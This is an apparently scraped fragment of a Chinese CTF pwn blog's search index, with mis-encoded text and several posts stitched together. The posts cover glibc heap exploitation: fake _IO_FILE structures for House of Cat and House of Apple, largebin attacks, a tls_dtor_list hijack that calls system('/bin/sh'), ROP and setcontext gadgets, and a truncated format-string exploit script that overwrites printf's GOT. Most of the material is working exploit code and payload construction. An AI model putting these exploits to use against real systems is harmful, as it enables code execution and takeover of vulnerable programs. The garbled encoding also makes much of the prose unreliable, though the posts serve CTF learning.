wide_data+=p64(0)#                        raxå³0x1178+0x30+heap_base
wide_data+=p64(0xdeadbeef)#                   rbpå³heap_base+0x1180+0x30
wide_data+=p64(add_rsp_ret)      #        add    rsp,0x18
wide_data+=p64(0xdeadbeef)
wide_data+=p64(0x1e8+fake_io_addr)#   [rbp+0x18]  
wide_data+=p64(leave_ret)          #second call  [rax+0x28]
wide_data+=rop


io_file=p64(0)*7
io_file+=p64(fake_io_addr+0x1f0)#  rbp   io_save_base   [rdi+0x48]   
io_file+=p64(0)*7
io_file+=p64(lock)+p64(0)*2
io_file+=p64(fake_io_addr+0xe0)#wide_data
io_file+=p64(0)*6
io_file+=p64(libc_base+0x2160c0+0x10)#vtable   _IO_wfile_jumps+0x10
io_file+=wide_data
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¯¦ç»†å‚æ•°ç‰ˆï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;fake_struct = p64(0) #_IO_read_end
fake_struct += p64(0) #_IO_read_base
fake_struct += p64(0) #_IO_write_base
fake_struct += p64(0) #_IO_write_ptr
fake_struct += p64(0) #_IO_write_end
fake_struct += p64(0) #_IO_buf_base
fake_struct += p64(1) #_IO_buf_end
fake_struct += p64(0) #_IO_save_base
fake_struct += p64(fake_io_addr + 0xb0) #_IO_backup_base = rdx
fake_struct += p64(setcontext + 61) #_IO_save_end = call_addr
fake_struct += p64(0)  #_markers
fake_struct += p64(0)  #_chain
fake_struct += p64(0)  #_fileno
fake_struct += p64(0)  #_old_offset
fake_struct += p64(0)  #_cur_column
fake_struct += p64(heap_base + 0x200) #_lock = heap_addr or writeable libc_addr
fake_struct += p64(0) #_offset
fake_struct += p64(0) #_codecvx
fake_struct += p64(fake_io_addr + 0x30) #_wfile_data rax1
fake_struct += p64(0) #_freers_list
fake_struct += p64(0) #_freers_buf
fake_struct += p64(0) #__pad5
fake_struct += p32(0) #_mode
fake_struct += b&amp;quot;\x00&amp;quot;*20 #_unused2
fake_struct += p64(_IO_wfile_jumps + 0x10) #vatable
fake_struct += p64(0)*6 #padding
fake_struct += p64(fake_io_addr + 0x40) #rax2 -&amp;gt; to make [rax+0x18] = setcontext + 61
&lt;/code&gt;&lt;/pre&gt;
">[å¼ºç½‘æ¯]house of cat</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/protobuf/"" data-c="
          &lt;p&gt;&lt;a href=&#34;https://zzkkk1h.github.io/wp/ciscn2024%E5%88%9D%E8%B5%9B-Pwn-wp/index.html&#34;&gt;å­¦ä¹ é“¾æ¥&lt;/a&gt;&lt;br&gt;
ä¾‹é¢˜ä¸ºciscn2024åˆèµ›çš„ezbuf&lt;/p&gt;
&lt;h1 id=&#34;pbtké€†å‘åè®®&#34;&gt;pbtké€†å‘åè®®&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;cd pbtk
./gui.py
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é€‰æ‹©ç¬¬ä¸€ä¸ªé€‰é¡¹&lt;/p&gt;
&lt;h1 id=&#34;æ‰‹åŠ¨é€†å‘åè®®&#34;&gt;æ‰‹åŠ¨é€†å‘åè®®&lt;/h1&gt;
&lt;p&gt;é­”æ•°ï¼š0x28AAEEF9&lt;br&gt;
æ¢å¤çš„ç»“æ„ä½“ï¼ˆé€‰ä¸­æ•°æ®,alt+Qï¼‰ï¼š&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1722338352659.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å¦‚æœn_filedsä¸º5,è¡¨æ˜å…¶ä¸­å«æœ‰5ä¸ªå˜é‡ï¼Œç‚¹è¿›fieldsåˆ†ææ¯ä¸ªfield&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;typedef enum {
	PROTOBUF_C_TYPE_INT32,      /**&amp;lt; int32 */
	PROTOBUF_C_TYPE_SINT32,     /**&amp;lt; signed int32 */
	PROTOBUF_C_TYPE_SFIXED32,   /**&amp;lt; signed int32 (4 bytes) */
	PROTOBUF_C_TYPE_INT64,      /**&amp;lt; int64 */
	PROTOBUF_C_TYPE_SINT64,     /**&amp;lt; signed int64 */
	PROTOBUF_C_TYPE_SFIXED64,   /**&amp;lt; signed int64 (8 bytes) */
	PROTOBUF_C_TYPE_UINT32,     /**&amp;lt; unsigned int32 */
	PROTOBUF_C_TYPE_FIXED32,    /**&amp;lt; unsigned int32 (4 bytes) */
	PROTOBUF_C_TYPE_UINT64,     /**&amp;lt; unsigned int64 */
	PROTOBUF_C_TYPE_FIXED64,    /**&amp;lt; unsigned int64 (8 bytes) */
	PROTOBUF_C_TYPE_FLOAT,      /**&amp;lt; float */
	PROTOBUF_C_TYPE_DOUBLE,     /**&amp;lt; double */
	PROTOBUF_C_TYPE_BOOL,       /**&amp;lt; boolean */
	PROTOBUF_C_TYPE_ENUM,       /**&amp;lt; enumerated type */
	PROTOBUF_C_TYPE_STRING,     /**&amp;lt; UTF-8 or ASCII string */
	PROTOBUF_C_TYPE_BYTES,      /**&amp;lt; arbitrary byte sequence */
	PROTOBUF_C_TYPE_MESSAGE,    /**&amp;lt; nested message */
} ProtobufCType;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;fieldï¼š&lt;img src=&#34;https://l1u66.github.io//post-images/1722339033167.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å…‰æ ‡ä¸Šä¸€è¡Œçš„0xfå³è¯¥fieldçš„PROTOBUF_C_TYPE_BYTESï¼ˆbytesï¼‰ç±»å‹ï¼ˆProtobufCTypeä»ä¸Šå¾€ä¸‹ï¼Œä»0å¼€å§‹ï¼‰ï¼Œåä¸ºwhatconï¼ŒæŒ‰ç…§è¿™æ ·çš„æ–¹æ³•ä¾æ¬¡æå–å‡ºæ‰€æœ‰fieldï¼Œå†™åˆ°heybro.protoæ–‡ä»¶ä¸­&lt;br&gt;
è¿™é‡Œçš„heybroæ¥è‡ªäºç»“æ„ä½“çš„name&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1722339333688.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;syntax=&amp;quot;proto3&amp;quot;; //proto version 2 or 3

message heybro{
    bytes whatcon = 1;
    sint64 whattodo = 2;
    sint64 whatidx = 3;
    sint64 whatsize = 4;
    uint32 whatsthis = 5;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆ©ç”¨&lt;code&gt;protoc heybro.proto --python_out=./&lt;/code&gt;å‘½ä»¤ç”Ÿæˆpythonè¯­è¨€çš„ä»£ç ï¼Œå¾—åˆ°ä¸€ä¸ªpythonæ–‡ä»¶ï¼Œå¯ä»¥åœ¨expä¸­å¯¼å…¥ï¼Œæ„å»ºç›¸åº”çš„protobufåŒ…&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import heybro_pb2 # ä¸è¦åŠ .py
data = heybro_pb2.heybro() # æ–¹æ³•åç§°è·Ÿéš.protoä¸­ç»“æ„ä½“åç§°å˜åŒ–
data.whattodo = todo
data.whatcon = content
data.whatidx = index
data.whatsize = size
data.whatsthis = this
data.SerializeToString() # è½¬æ¢æˆbytes
&lt;/code&gt;&lt;/pre&gt;
">protobuf</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/suo-sui-zhi-shi-dian/"" data-c="
          &lt;h1 id=&#34;ioåç§»è¡¨&#34;&gt;IOåç§»è¡¨&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;0x0   _flags
0x8   _IO_read_ptr
0x10  _IO_read_end
0x18  _IO_read_base
0x20  _IO_write_base
0x28  _IO_write_ptr
0x30  _IO_write_end
0x38  _IO_buf_base
0x40  _IO_buf_end
0x48  _IO_save_base
0x50  _IO_backup_base
0x58  _IO_save_end
0x60  _markers
0x68  _chain
0x70  _fileno
0x74  _flags2
0x78  _old_offset
0x80  _cur_column
0x82  _vtable_offset
0x83  _shortbuf
0x88  _lock
0x90  _offset
0x98  _codecvt
0xa0  _wide_data
0xa8  _freeres_list
0xb0  _freeres_buf
0xb8  __pad5
0xc0  _mode
0xc4  _unused2
0xd8  vtable
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;tls&#34;&gt;TLS&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;åœ¨gdbé‡Œä½¿ç”¨&lt;code&gt;fsbase&lt;/code&gt;å‘½ä»¤å¯ä»¥æ‰¾åˆ°TLSç»“æ„ä½“çš„åœ°å€&lt;/li&gt;
&lt;li&gt;&lt;code&gt;p &amp;amp;tls_dtor_list&lt;/code&gt;æ‰¾åˆ°tls_dtor_list&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ç›´æ¥æ‹¿åˆ°shell&#34;&gt;ç›´æ¥æ‹¿åˆ°shellï¼š&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;ROL = lambda val, r_bits, max_bits: \
    (val &amp;lt;&amp;lt; r_bits%max_bits) &amp;amp; (2**max_bits-1) | \
    ((val &amp;amp; (2**max_bits-1)) &amp;gt;&amp;gt; (max_bits-(r_bits%max_bits)))
 
# ä¸¤æ¬¡largebin attackæ”¹tls_dtor_listä¸pointer_guard
 
fake_pointer_guard = heap_base + 0x17b0
edit(0, b&#39;a&#39;*0x420 + p64(ROL(libc.sym[&#39;system&#39;] ^ fake_pointer_guard, 0x11, 64)) + p64(next(libc.search(b&#39;/bin/sh&#39;))))
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;rop&#34;&gt;rop:&lt;/h2&gt;
&lt;p&gt;æŠŠtls_dtor_listçš„å¤´èŠ‚ç‚¹å†™ä¸ºä¸€ä¸ªå †åœ°å€heap_address_ctrï¼Œç„¶ååœ¨heap_address_ctrå†™å…¥leave retçš„gadgetæŒ‡é’ˆï¼Œè¿™æ ·ï¼Œcall rax åï¼Œrip æŒ‡å‘äº†heap_address_ctr +8ï¼Œæˆ‘ä»¬å°±å®Œæˆäº†æ ˆçš„åŠ«æŒï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œå¸ƒç½®ropã€‚&lt;/p&gt;
&lt;h1 id=&#34;pie&#34;&gt;PIE&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;gdb.attach(io,&amp;quot;b *$rebase(0x16cc)&amp;quot;)&lt;/code&gt;å¼€å¯pieä¸‹æ–­ç‚¹&lt;/p&gt;
&lt;h1 id=&#34;è„šæœ¬dump-seccomp-tools&#34;&gt;è„šæœ¬dump seccomp-tools&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;process(&amp;quot;seccomp-tools dump ./test&amp;quot;,shell=True)&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;magic-gadgets&#34;&gt;magic gadgets&lt;/h1&gt;
&lt;h2 id=&#34;svcudp_reply&#34;&gt;svcudp_reply&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;svcudp_reply+26&amp;gt;:    mov    rbp,QWORD PTR [rdi+0x48]
&amp;lt;svcudp_reply+30&amp;gt;:    mov    rax,QWORD PTR [rbp+0x18]
&amp;lt;svcudp_reply+34&amp;gt;:    lea    r13,[rbp+0x10]
&amp;lt;svcudp_reply+38&amp;gt;:    mov    DWORD PTR [rbp+0x10],0x0
&amp;lt;svcudp_reply+45&amp;gt;:    mov    rdi,r13
&amp;lt;svcudp_reply+48&amp;gt;:    call   QWORD PTR [rax+0x28]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;ROPgadget --binary &#39;/home/tutu/æ¡Œé¢/pwn/houseofcat/libc.so.6&#39; --opcode 488b6f48488b4518&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;setcontext&#34;&gt;setcontext&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt; 0x7fe165955a6d &amp;lt;setcontext+61&amp;gt;     mov    rsp, qword ptr [rdx + 0xa0]
   0x7fe165955a74 &amp;lt;setcontext+68&amp;gt;     mov    rbx, qword ptr [rdx + 0x80]
   0x7fe165955a7b &amp;lt;setcontext+75&amp;gt;     mov    rbp, qword ptr [rdx + 0x78]
   0x7fe165955a7f &amp;lt;setcontext+79&amp;gt;     mov    r12, qword ptr [rdx + 0x48]
   0x7fe165955a83 &amp;lt;setcontext+83&amp;gt;     mov    r13, qword ptr [rdx + 0x50]
   0x7fe165955a87 &amp;lt;setcontext+87&amp;gt;     mov    r14, qword ptr [rdx + 0x58]
   0x7fe165955a8b &amp;lt;setcontext+91&amp;gt;     mov    r15, qword ptr [rdx + 0x60]
   0x7fe165955a8f &amp;lt;setcontext+95&amp;gt;     test   dword ptr fs:[0x48], 2
   0x7fe165955a9b &amp;lt;setcontext+107&amp;gt;    je     setcontext+294                &amp;lt;setcontext+294&amp;gt;
   ......
   0x7fe165955b56 &amp;lt;setcontext+294&amp;gt;    mov    rcx, qword ptr [rdx + 0xa8]
   0x7fe165955b5d &amp;lt;setcontext+301&amp;gt;    push   rcx
   0x7fe165955b5e &amp;lt;setcontext+302&amp;gt;    mov    rsi, qword ptr [rdx + 0x70]
   0x7fe165955b62 &amp;lt;setcontext+306&amp;gt;    mov    rdi, qword ptr [rdx + 0x68]
   0x7fe165955b66 &amp;lt;setcontext+310&amp;gt;    mov    rcx, qword ptr [rdx + 0x98]
   0x7fe165955b6d &amp;lt;setcontext+317&amp;gt;    mov    r8, qword ptr [rdx + 0x28]
   0x7fe165955b71 &amp;lt;setcontext+321&amp;gt;    mov    r9, qword ptr [rdx + 0x30]
   0x7fe165955b75 &amp;lt;setcontext+325&amp;gt;    mov    rdx, qword ptr [rdx + 0x88]
   0x7fe165955b7c &amp;lt;setcontext+332&amp;gt;    xor    eax, eax
   0x7fe165955b7e &amp;lt;setcontext+334&amp;gt;    ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;ROPgadget --binary &#39;/home/tutu/æ¡Œé¢/pwn/houseofcat/libc.so.6&#39; --opcode 488ba2a00000&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;å…¶ä»–å¥½ç”¨çš„gadgets&#34;&gt;å…¶ä»–å¥½ç”¨çš„gadgets&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;é€šè¿‡rdiæ§åˆ¶raxï¼Œå¹¶call&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;0x000000000015d65a : mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x10]
0x000000000015d5c1 : mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x18]
0x00000000001673c9 : mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x20]
0x000000000015d50c : mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 8]
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;é€šè¿‡rdxæ§åˆ¶rsp&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;0x000000000005a170 : mov rsp, rdx ; ret
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;é€šè¿‡rdiæ§åˆ¶rdxï¼Œé€šè¿‡raxæ§åˆ¶rspï¼Œè°ƒç”¨rdxï¼ˆä¹Ÿå¯ä»¥æ ˆè¿ç§»ï¼‰&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;0x00000000001675b0 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;æ‰¾flag&#34;&gt;æ‰¾flag&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;find / -name *flag*&lt;/code&gt;&lt;/p&gt;
">çç¢çŸ¥è¯†ç‚¹</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/house-of-apple/"" data-c="
          &lt;p&gt;è¯¥æ‰“æ³•ä¸€æ¬¡largebin attackå°±èƒ½æ‹¿åˆ°shellï¼Œä¸å¯ä¸ç§°nbï¼Œæ®è¯´é«˜ç‰ˆæœ¬åŸºæœ¬é€šæ€ï¼Œæ›´æ˜¯nbä¸­çš„nbï¼Œå¦å¤–è¿˜æœ‰ä¸€æ¡_IO_obstack_jumpsé“¾ï¼Œä¾‹é¢˜è¯¦æƒ…è§ litctf2024-heap2.35&lt;br&gt;
&lt;a href=&#34;https://bbs.kanxue.com/thread-273832.htm#msg_header_h2_0&#34;&gt;å­¦ä¹ ä¼ é€é—¨&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;é«˜ç‰ˆæœ¬230ä¹‹ålargebin-attack&#34;&gt;é«˜ç‰ˆæœ¬(2.30ä¹‹å)Largebin attack&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;if ((unsigned long) (size) &amp;lt; (unsigned long) chunksize_nomask (bck-&amp;gt;bk))
{
    fwd = bck;
    bck = bck-&amp;gt;bk;
    victim-&amp;gt;fd_nextsize = fwd-&amp;gt;fd;
    victim-&amp;gt;bk_nextsize = fwd-&amp;gt;fd-&amp;gt;bk_nextsize; // 1
    fwd-&amp;gt;fd-&amp;gt;bk_nextsize = victim-&amp;gt;bk_nextsize-&amp;gt;fd_nextsize = victim; // 2
}
else
...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;1.åœ¨largebin listä¸­æ”¾å…¥ä¸€ä¸ªå †å—Aï¼Œå¹¶åˆ©ç”¨UAFç­‰æ¼æ´ä¿®æ”¹å…¶å†…å®¹ä¸ºp64(0)*3 + p64(target_addr - 0x20)ï¼Œä¹Ÿå°±æ˜¯åœ¨bk_nextsizeå†™å…¥target_addr - 0x20&lt;/p&gt;
&lt;p&gt;2.é‡Šæ”¾ä¸€ä¸ªå¤§å°ç•¥å°äºå †å—Açš„å †å—Bè¿›å…¥åˆ°åŒä¸€ä¸ªlargebin listï¼Œæ­¤æ—¶å°±ä¼šåœ¨target_addrä¸­å†™å…¥å †å—Bçš„åœ°å€&lt;br&gt;
åŸç†è§£é‡Šï¼šæºç ä¸­çš„bckå°±æ˜¯largebin listçš„å¤´éƒ¨ï¼Œè€Œbck-&amp;gt;fdå°±æŒ‡å‘äº†å…¶ä¸­sizeæœ€å°çš„å †å—ï¼Œå°†æºç ä¸­1å¸¦å…¥2ä¸­å¾—ï¼šfwd-&amp;gt;fd-&amp;gt;bk_nextsize-&amp;gt;fd_nextsize = victimï¼Œåˆåœ¨ä¹‹å‰æœ‰fwd = bckï¼Œfwd-&amp;gt;fdå°±æ˜¯largebin listå¤´éƒ¨çš„fdï¼Œè€Œæ­¤largebin liståœ¨åŠ å…¥å †å—Bä¹‹å‰åªæœ‰å †å—Aï¼Œå› æ­¤fwd-&amp;gt;fd-&amp;gt;bk_nextsize-&amp;gt;fd_nextsize = victimå°±æ˜¯å †å—Açš„bk_nextsize-&amp;gt;fd_nextsizeä¹Ÿå°±æ˜¯target_addrå¤„å†™å…¥äº†victimä¹Ÿå°±æ˜¯å †å—Bçš„åœ°å€ã€‚&lt;/p&gt;
&lt;h1 id=&#34;house-of-apple&#34;&gt;House of apple&lt;/h1&gt;
&lt;p&gt;æ”»å‡»çš„è°ƒç”¨é“¾ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;_IO_wfile_overflow --&amp;gt; _IO_wdoallocbuf --&amp;gt; _IO_WDOALLOCATE
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;æ”»å‡»æ€è·¯&#34;&gt;æ”»å‡»æ€è·¯ï¼š&lt;/h2&gt;
&lt;p&gt;å…ˆåˆ©ç”¨Largebin attackåŠ«æŒ_IO_list_allç»“æ„ä½“ï¼Œå°†æ–‡ä»¶æµåŠ«æŒåˆ°å †ä¸Šåï¼Œéœ€è¦å¯¹fpçš„è¿›è¡Œä¸€äº›è®¾ç½®ï¼Œå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;_flagsè®¾ç½®ä¸º~(2 | 0x8 | 0x800)ï¼Œå¦‚æœä¸éœ€è¦æ§åˆ¶rdiï¼Œè®¾ç½®ä¸º0å³å¯ï¼›å¦‚æœéœ€è¦è·å¾—shellï¼Œå¯è®¾ç½®ä¸º sh;ï¼Œæ³¨æ„å‰é¢æœ‰ä¸¤ä¸ªç©ºæ ¼&lt;/li&gt;
&lt;li&gt;vtableè®¾ç½®ä¸º_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmapåœ°å€ï¼ˆåŠ å‡åç§»ï¼‰ï¼Œä½¿å…¶èƒ½æˆåŠŸè°ƒç”¨_IO_wfile_overflowå³å¯&lt;/li&gt;
&lt;li&gt;_wide_dataè®¾ç½®ä¸ºå¯æ§å †åœ°å€Aï¼Œå³æ»¡è¶³*(fp + 0xa0) = A&lt;/li&gt;
&lt;li&gt;_wide_data-&amp;gt;_IO_write_baseè®¾ç½®ä¸º0ï¼Œå³æ»¡è¶³*(A + 0x18) = 0&lt;/li&gt;
&lt;li&gt;_wide_data-&amp;gt;_IO_buf_baseè®¾ç½®ä¸º0ï¼Œå³æ»¡è¶³*(A + 0x30) = 0&lt;/li&gt;
&lt;li&gt;_wide_data-&amp;gt;_wide_vtableè®¾ç½®ä¸ºå¯æ§å †åœ°å€Bï¼Œå³æ»¡è¶³*(A + 0xe0) = B&lt;/li&gt;
&lt;li&gt;_wide_data-&amp;gt;_wide_vtable-&amp;gt;doallocateè®¾ç½®ä¸ºåœ°å€Cç”¨äºåŠ«æŒRIPï¼Œå³æ»¡è¶³*(B + 0x68) = C&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;edit(8, b&#39;A&#39; * 0x10 + p32(0xfffff7f5) + b&#39;;sh\x00&#39;) # _flagsæ ‡å¿—ä½ï¼ˆintç±»å‹çš„ï¼‰

fake_io_file = p64(0)*2 + p64(1) + p64(2)
fake_io_file = fake_io_file.ljust(
    0xa0 - 0x10, b&#39;\0&#39;) + p64(chunk_addr + 0x100)  # _wide_data (A)
fake_io_file = fake_io_file.ljust(
    0xc0 - 0x10, b&#39;\0&#39;) + p64(0xffffffffffffffff)  # _mode
fake_io_file = fake_io_file.ljust(
    0xd8 - 0x10, b&#39;\0&#39;) + p64(io_wfile_jumps)  # vtable
fake_io_file = fake_io_file.ljust(
    0x100 - 0x10 + 0xe0, b&#39;\0&#39;) + p64(chunk_addr + 0x200)  # B
fake_io_file = fake_io_file.ljust(
    0x200 - 0x10, b&#39;\0&#39;) + p64(0)*13 + p64(system)  # C
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦‚æœæœ‰èƒ½åŠ›ç›´æ¥æ”¹å†™stderrç­‰ç»“æ„ä½“å¯ä»¥ç›´æ¥è¿™æ ·æ„é€ (å°±æ˜¯å¯ä»¥ç›´æ¥æ”¹_flagä½)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;fake_file = flat({
       0x0: b&amp;quot;  sh;&amp;quot;,
       0x28: libc_base + libc.symbols[&#39;system&#39;],
       0x88: libc_base + libc.symbols[&#39;_environ&#39;]-0x10,
       0xa0: libc_base+libc.symbols[&#39;_IO_2_1_stderr_&#39;]-0x40,   # _wide_data
       0xD8: libc_base + libc.symbols[&#39;_IO_wfile_jumps&#39;], # jumptable
   }, filler=b&amp;quot;\x00&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ–è€…éœ€è¦æ‰“orw&lt;br&gt;
magic gadgets:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;svcudp_reply+26&amp;gt;:  mov  rbp,QWORD PTR [rdi+0x48]
&amp;lt;svcudp_reply+30&amp;gt;:  mov  rax,QWORD PTR [rbp+0x18]
&amp;lt;svcudp_reply+34&amp;gt;:  lea  r13,[rbp+0x10]
&amp;lt;svcudp_reply+38&amp;gt;:  mov  DWORD PTR [rbp+0x10],0x0
&amp;lt;svcudp_reply+45&amp;gt;:  mov  rdi,r13
&amp;lt;svcudp_reply+48&amp;gt;:  call  QWORD PTR [rax+0x28]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å°†Cçš„åœ°å€æ”¹ä¸ºmagic gadgetsï¼Œæ­¤æ—¶æ‰§è¡Œåˆ°Cæ—¶çš„rdiå°±æ˜¯fpçš„åœ°å€ï¼Œæ­¤æ—¶å¯ä»¥è®¾è®¡rbpçš„å€¼å’Œraxçš„å€¼ï¼Œ[rax+0x28]è®¾ç½®ä¸ºleave retï¼Œå°±ç›¸å½“äºä¸€ä¸ªæ ˆè¿ç§»ï¼Œåœ¨å †å—ä¸­è®¾ç½®å¥½orwä¾¿å¯æ„é€ æ‰§è¡Œ&lt;/p&gt;
">House of apple</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/dasctf-2024-shu-qi-tiao-zhan-sai/"" data-c="
          &lt;h1 id=&#34;spring_board&#34;&gt;spring_board&lt;/h1&gt;
&lt;p&gt;é˜…è¯»ç¨‹åºå‘ç°æ˜¯æœ‰äº”æ¬¡çš„éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œç”¨æ¥è®¡æ•°çš„iå˜é‡ä½äºæ ˆä¸Šï¼Œåªæœ‰äº”æ¬¡çš„è¯è¦åšåˆ°æ³„éœ²libcåœ°å€ï¼Œæ ˆåœ°å€å¹¶ä¸”åšåˆ°ä¿®æ”¹printfçš„gotè¡¨ä¸ºsystemä¸å¤ªå¤Ÿç”¨ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æŠŠiå˜é‡ç»™æ”¹æ‰ï¼Œä»è€Œè¾¾åˆ°é‡ç½®æ¬¡æ•°çš„ç›®çš„ï¼Œå…¶ä»–çš„æ€è·¯å’Œéæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸€æ ·&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./pwn&amp;quot;)
# p = remote(&#39;node5.buuoj.cn&#39;,27012)
elf = ELF(&amp;quot;./pwn&amp;quot;)

# stack libc
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,&amp;quot;%11$p-%9$p&amp;quot;)
p.recvuntil(&amp;quot;0x&amp;quot;)
stack = int(p.recv(12),16)
ebp = stack - 232
count = ebp - 4
print(&amp;quot;stack = &amp;quot;,hex(stack))
print(&amp;quot;stack = &amp;quot;,hex(ebp))
p.recvuntil(&amp;quot;0x&amp;quot;)
libc_base = int(p.recv(12),16) - 133184
print(&amp;quot;main = &amp;quot;,hex(libc_base))
sys = libc_base + 0x0000000000453A0
print(&amp;quot;sys = &amp;quot;,hex(sys))
cc = (count) &amp;amp; 0xffff
payload = b&#39;%&#39; + str(cc).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%11$hn&#39;
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,payload)

payload = b&#39;%c%37$hn&#39;
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,payload)


printf_got = 0x601028

s1 = (ebp + 5*8) &amp;amp; 0xffff
s11 = s1 + 2
payload = b&#39;%&#39; + str(s1).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%25$hn&#39;
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,payload)
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,&amp;quot;%4136c%39$hn&amp;quot;)

payload = b&#39;%c%37$hn&#39;
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,payload)

payload = b&#39;%&#39; + str(s11).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%25$hn&#39;
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,payload)
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,&amp;quot;%96c%39$hhn&amp;quot;)

payload = b&#39;%c%37$hn&#39;
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,payload)

s2 = (ebp + 8*8) &amp;amp; 0xffff
s22 = s2 + 2
payload = b&#39;%&#39; + str(s2).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%25$hn&#39;
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,payload)
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,&amp;quot;%4138c%39$hn&amp;quot;)

payload = b&#39;%c%37$hn&#39;
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,payload)

payload = b&#39;%&#39; + str(s22).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%25$hn&#39;
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,payload)
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,&amp;quot;%96c%39$hhn&amp;quot;)

payload = b&#39;%c%37$hn&#39;
p.sendlineafter(&amp;quot;keyword\n&amp;quot;,payload)

# gdb.attach(p)
# pause()

x1 = sys &amp;amp; 0xffff
payload = b&#39;%&#39; + str(x1).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%13$hn&#39;
x2 = (sys &amp;gt;&amp;gt; 16) &amp;amp; 0xffff
payload += b&#39;%&#39; + str(0x10000 + x2 - x1).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%16$hn&#39;
